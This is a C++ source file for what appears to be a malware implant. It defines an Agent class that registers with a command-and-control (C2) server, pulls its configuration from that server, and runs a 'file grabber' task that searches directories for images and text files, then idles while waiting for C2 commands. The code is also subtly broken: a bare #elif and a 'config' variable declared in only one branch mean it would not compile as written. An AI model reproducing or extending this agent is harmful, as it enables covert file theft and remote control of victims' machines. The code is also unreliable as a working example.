#include "Agent.h"

void Agent::start()
{
    #ifdef DEBUG
    std::string json_string = R"(
    {
        "FILE_GRABGER": 
        {
            "1337": 
            {
            "start_path": "/tmp/aa",
            "files": [".*.jpg", ".*\\.txt$"]
            },
            "1338": 
            {
                "start_path": "/tmp/gg",
                "files": [".*abcd"]
            }
        }
    }
    )";
    
    json config = json::parse(json_string);

    #elif

    unsigned tries = 0;
    while (!agent_register())
    {
        tries += 1;
        if (tries >= 10)
        {
            throw std::runtime_error("Can't register to C2");
        }
        
        sleep(5);
    }
    
    config = get_server_config();

    #endif

    start_from_config(config);

    while (agent_run)
    {
        /* In reality we send http request to the c2, requesting new commands in this for loop */
        sleep(60 * 60);
    }
    
}


void Agent::stop()
{
    for (const std::unique_ptr<Task> & t : tasks)
    {
        t->stop();
    } 
}